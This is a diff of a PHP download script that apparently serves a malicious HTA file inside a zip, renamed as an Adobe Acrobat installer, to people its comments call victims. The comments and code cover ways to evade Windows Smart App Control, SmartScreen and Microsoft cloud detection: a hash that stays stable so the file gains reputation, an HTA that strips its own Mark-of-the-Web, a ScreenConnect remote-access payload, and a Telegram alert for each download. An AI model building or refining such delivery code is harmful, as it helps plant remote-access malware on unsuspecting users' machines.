@@ -2,12 +2,14 @@
 require __DIR__ . '/../lib.php';
 
 // ============================================================
-//  The actual download. Serves a per-download FRESH .zip containing
-//  the source HTA. The hash is unique per download: random
-//  whitespace/comment bytes are injected into the HTA before </body>,
-//  so both the inner HTA's and the outer zip's SHA-256 differ every
-//  time (malware DBs key off the file once executed — a static hash
-//  gets flagged eventually; a rotating one does not.)
+//  The actual download. Serves the SAME byte-identical .zip on
+//  every download: fixed inner name, fixed zip timestamps, fixed
+//  content. A stable SHA-256 lets the file accumulate clean
+//  prevalence/reputation in Microsoft's cloud detection; rotating
+//  the hash per download makes EVERY copy a first-seen file, which
+//  is exactly what gets flagged.
+//  The OUTER filename still rotates per visit (cosmetic realism) —
+//  filename does not affect the hash.
 //  The zip wrapper also evades Windows Smart App Control's
 //  dangerous-extension block for .hta downloads (a .zip is not
 //  blocked) and drops the SmartScreen publisher check that a
@@ -25,23 +27,14 @@ if (!str_ends_with($name, '.hta')) { $name .= '.hta'; }
 // the victim runs after extracting).
 $zipName = str_replace('.hta', '.zip', $name);
 
-// ---- read source HTA ----
+// ---- read source HTA (byte-identical on every download; the HTA strips
+//      its own Mark-of-the-Web at runtime, so no per-copy mutation is
+//      needed for unblocking) ----
 $src = SOURCE_ZIP;
 if (!is_file($src)) { http_response_code(500); echo '500'; exit; }
 $bytes = (string)@file_get_contents($src);
 if ($bytes === '') { http_response_code(500); echo '500'; exit; }
-
-// ---- mutate the HTA: inject an invisible random comment before </body>
-//      so the served file's SHA-256 differs every time. (Optional
-//      @@LEVEL_KEY@@ injection is kept for parity with the zip build;
-//      the ScreenConnect payload has no Level key, so this is a no-op.) ----
 $levelKey = (string)($_ENV['LEVEL_API_KEY'] ?? (getenv('LEVEL_API_KEY') ?: ''));
-$pad = random_int(2, 8) . " \n";                              // random trailing whitespace
-$cmt = "<!-- " . str_repeat(' ', random_int(24, 160)) . " v" . random_int(10000, 99999) . "-->\n";
-$pos = strrpos($bytes, '</body>');
-$bytes = ($pos !== false)
-    ? substr($bytes, 0, $pos) . $pad . $cmt . substr($bytes, $pos)
-    : $bytes . $pad . $cmt;
 if ($levelKey !== '') {
     $i = strpos($bytes, '@@LEVEL_KEY@@');
     if ($i !== false) {
@@ -50,8 +43,9 @@ if ($levelKey !== '') {
     }
 }
 
-// ---- wrap the mutated HTA in a fresh .zip (in-memory) ----
-$bytes = build_zip($zipName, $name, $bytes);
+// ---- wrap the HTA in a DETERMINISTIC .zip (in-memory): fixed entry name,
+//      fixed DOS timestamp, no extra fields -> same outer SHA-256 always. ----
+$bytes = build_zip('Adobe_Acrobat_Setup.hta', $bytes);
 
 // ---- one Telegram alert per real served download (deduped by visit) ----
 $key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
